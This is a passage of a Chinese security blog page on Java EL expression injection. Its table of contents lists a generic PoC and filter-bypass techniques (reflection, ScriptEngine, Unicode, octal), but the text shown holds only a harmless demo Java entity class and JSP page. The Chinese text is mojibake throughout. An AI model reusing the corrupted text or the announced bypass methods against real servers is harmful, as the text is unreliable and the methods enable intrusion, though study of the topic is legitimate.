
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>ELè¡¨è¾¾å¼æ³¨å…¥ | é›²æµã®Lowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdnæŒ‚æ‰çš„æ—¶å€™è¦å¯ä»¥å¼•ç”¨æœ¬åœ° -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- å¼•å…¥jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--æ”¹æˆäº†prismjsé«˜äº®-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- å¼•å…¥ä¸è’œå­-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- ä»£ç è¯­è¨€ -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- ä»£ç å—å¤åˆ¶ -->
<!-- å¼•å…¥clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- ä»£ç å—æ”¶ç¼© -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- ä»£ç å—æŠ˜è¡Œ -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="é›²æµã®Lowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- é¡µé¢ç‚¹å‡»ç‰¹æ•ˆ -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- æµè§ˆå™¨æ ‡é¢˜ -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- åŠ¨æ€èƒŒæ™¯ -->
    

    <!--æ–‡ç« ç›®å½•-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  ç›®å½•</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81jsp-Demo"><span class="toc-number">2.</span> <span class="toc-text">åŠ¨æ€jsp Demo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EL"><span class="toc-number">3.</span> <span class="toc-text">EL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">åŸºæœ¬è¯­æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E-%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">3.1.1.</span> <span class="toc-text">[ ]ä¸.è¿ç®—ç¬¦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#empty"><span class="toc-number">3.1.2.</span> <span class="toc-text">empty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">æ¡ä»¶è¡¨è¾¾å¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">å˜é‡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Demo"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">3.1.5.</span> <span class="toc-text">æ“ä½œç¬¦</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">éšå¼å¯¹è±¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">ELä¸­çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8Java%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">è°ƒç”¨Javaæ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-x2F-%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">å¯åŠ¨&#x2F;ç¦ç”¨ELè¡¨è¾¾å¼</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8poc"><span class="toc-number">5.1.</span> <span class="toc-text">é€šç”¨poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF"><span class="toc-number">5.2.</span> <span class="toc-text">æ¼æ´åœºæ™¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2011-2730"><span class="toc-number">5.3.</span> <span class="toc-text">CVE-2011-2730</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JUEL"><span class="toc-number">5.3.1.</span> <span class="toc-text">JUEL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.</span> <span class="toc-text">ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-number">5.4.1.</span> <span class="toc-text">åˆ©ç”¨åå°„æœºåˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ScriptEngine%E8%B0%83%E7%94%A8JS%E5%BC%95%E6%93%8E"><span class="toc-number">5.4.2.</span> <span class="toc-text">åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.3.</span> <span class="toc-text">åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.4.</span> <span class="toc-text">åˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">é˜²å¾¡</span></a></li></ol>
    </div>
  

    <!--è¿”å›é¡¶éƒ¨-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="è¿”å›é¡¶éƒ¨">â†‘</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>ç¬¬ä¸€æ¬¡åŠ è½½æ–‡ç« å›¾ç‰‡å¯èƒ½ä¼šèŠ±è´¹è¾ƒé•¿æ—¶é—´</p>
                    <p>è¦ä¸æŒ‚ä¸ªæ¢¯å­è¯•è¯•ï¼Ÿï¼ˆx</p>
                    <p>åŠ è½½è¿‡æ…¢è¯·å¼€å¯ç¼“å­˜&ensp;æµè§ˆå™¨é»˜è®¤å¼€å¯</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>é›²æµã®LOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;é›²æµã®LOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>ELè¡¨è¾¾å¼æ³¨å…¥</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/18
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
            </span>
            
        </span>
        
        <!--æ–‡ç« å­—æ•°ç»Ÿè®¡-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  å­—æ•°ç»Ÿè®¡: </span>
        <!-- å®‰è£…æ’ä»¶npm install hexo-wordcount --save -->
        <span class="post-count">5kå­—</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  é˜…è¯»æ—¶é•¿: </span>
        <span class="post-count">24åˆ†</span>
      </span>
    </span>
    
    <!--ä¸è’œå­ç»Ÿè®¡è®¿é—®æ•°-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    æ€»æ–‡ç« é˜…è¯»é‡ï¼š<span id="busuanzi_value_page_pv"></span>æ¬¡
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">http://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p>
<span id="more"></span>

<hr>
<h1 id="åŠ¨æ€jsp-Demo"><a href="#åŠ¨æ€jsp-Demo" class="headerlink" title="åŠ¨æ€jsp Demo"></a>åŠ¨æ€jsp Demo</h1><p>å‡†å¤‡ä¸€ä¸ªå®ä½“ç±»</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Band</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> bandName<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> ordered<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> description<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> status<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">,</span> <span class="token class-name">String</span> bandName<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name">AnimationName</span><span class="token punctuation">,</span> <span class="token class-name">String</span> description<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>bandName <span class="token operator">=</span> bandName<span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>AnimationName</span> <span class="token operator">=</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">,</span> <span class="token class-name">String</span> bandName<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name">AnimationName</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span> ordered<span class="token punctuation">,</span> <span class="token class-name">String</span> description<span class="token punctuation">,</span> <span class="token class-name">Integer</span> status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>bandName <span class="token operator">=</span> bandName<span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>AnimationName</span> <span class="token operator">=</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>ordered <span class="token operator">=</span> ordered<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> status<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getBandName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> bandName<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBandName</span><span class="token punctuation">(</span><span class="token class-name">String</span> bandName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>bandName <span class="token operator">=</span> bandName<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAnimationName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAnimationName</span><span class="token punctuation">(</span><span class="token class-name">String</span> animationName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">AnimationName</span> <span class="token operator">=</span> animationName<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getOrdered</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> ordered<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrdered</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> ordered<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>ordered <span class="token operator">=</span> ordered<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> description<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDescription</span><span class="token punctuation">(</span><span class="token class-name">String</span> description<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> status<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> status<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"Band&#123;"</span> <span class="token operator">+</span>
                <span class="token string">"id="</span> <span class="token operator">+</span> id <span class="token operator">+</span>
                <span class="token string">", bandName='"</span> <span class="token operator">+</span> bandName <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", AnimationName='"</span> <span class="token operator">+</span> <span class="token class-name">AnimationName</span> <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", ordered="</span> <span class="token operator">+</span> ordered <span class="token operator">+</span>
                <span class="token string">", description='"</span> <span class="token operator">+</span> description <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", status="</span> <span class="token operator">+</span> status <span class="token operator">+</span>
                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå‡†å¤‡åŠ¨æ€çš„jspä»£ç band.jsp</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;com.example.learnservlet.pojo.Band&quot; %&gt;
&lt;%@ page import&#x3D;&quot;java.util.List&quot; %&gt;
&lt;%@ page import&#x3D;&quot;java.util.ArrayList&quot; %&gt;
&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;

&lt;%
    &#x2F;&#x2F; æŸ¥è¯¢æ•°æ®åº“
    List&lt;Band&gt; brands &#x3D; new ArrayList&lt;Band&gt;();
    brands.add(new Band(1,&quot;ç»“æŸä¹é˜Ÿ&quot;,&quot;å­¤ç‹¬æ‘‡æ»š&quot;,100,&quot;Guitar Hero&quot;,1));
    brands.add(new Band(2,&quot;MyGO!!!!!&quot;,&quot;BanGDream It&#39;s MyGO!!!!!&quot;,200,&quot;ä¸ºä»€ä¹ˆè¦æ¼”å¥æ˜¥æ—¥å½±ï¼&quot;,1));
    brands.add(new Band(3,&quot;æœ‰åˆºæ— åˆº&quot;,&quot;Girls Band Cry&quot;,1000,&quot;å‡¸ğŸ˜„å‡¸&quot;,0));

%&gt;


&lt;!DOCTYPE html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
    &lt;title&gt;çœ‹å°‘å¥³ä¹é˜Ÿçœ‹çš„&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;æ–°å¢&quot;&gt;&lt;br&gt;
&lt;hr&gt;
&lt;table border&#x3D;&quot;1&quot; cellspacing&#x3D;&quot;0&quot; width&#x3D;&quot;800&quot;&gt;
    &lt;tr&gt;
        &lt;th&gt;åºå·&lt;&#x2F;th&gt;
        &lt;th&gt;ä¹é˜Ÿåç§°&lt;&#x2F;th&gt;
        &lt;th&gt;åŠ¨ç”»åç§°&lt;&#x2F;th&gt;
        &lt;th&gt;æ’åº&lt;&#x2F;th&gt;
        &lt;th&gt;ä»‹ç»&lt;&#x2F;th&gt;
        &lt;th&gt;çŠ¶æ€&lt;&#x2F;th&gt;
        &lt;th&gt;æ“ä½œ&lt;&#x2F;th&gt;
    &lt;&#x2F;tr&gt;
    &lt;%
        for (int i &#x3D; 0; i &lt; brands.size(); i++) &#123;
            Band brand &#x3D; brands.get(i);
    %&gt;
    &lt;tr align&#x3D;&quot;center&quot;&gt;
        &lt;td&gt;&lt;%&#x3D;brand.getId()%&gt;&lt;&#x2F;td&gt;
        &lt;td&gt;&lt;%&#x3D;brand.getBandName()%&gt;&lt;&#x2F;td&gt;
        &lt;td&gt;&lt;%&#x3D;brand.getAnimationName()%&gt;&lt;&#x2F;td&gt;
        &lt;td&gt;&lt;%&#x3D;brand.getOrdered()%&gt;&lt;&#x2F;td&gt;
        &lt;td&gt;&lt;%&#x3D;brand.getDescription()%&gt;&lt;&#x2F;td&gt;
        &lt;td&gt;&lt;%&#x3D;brand.getStatus() &#x3D;&#x3D; 1 ? &quot;å®Œç»“&quot;:&quot;åœ¨è¿½&quot;%&gt;&lt;&#x2F;td&gt;
        &lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;ä¿®æ”¹&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;#&quot;&gt;åˆ é™¤&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
    &lt;&#x2F;tr&gt;
    &lt;%
        &#125;
    %&gt;
&lt;&#x2F;table&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»¥ä¸Šå°±æ˜¯åŠ¨æ€jspçš„å®ç°</p>
<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716190934155.png" alt="image-20240716190934155"></p>
<hr>
<h1 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h1><p>å¯ä»¥ç†è§£ä¸ºç®€åŒ–çš„ Jsp</p>
<p>ELï¼ˆExpression Languageï¼‰åŠŸèƒ½ï¼š</p>
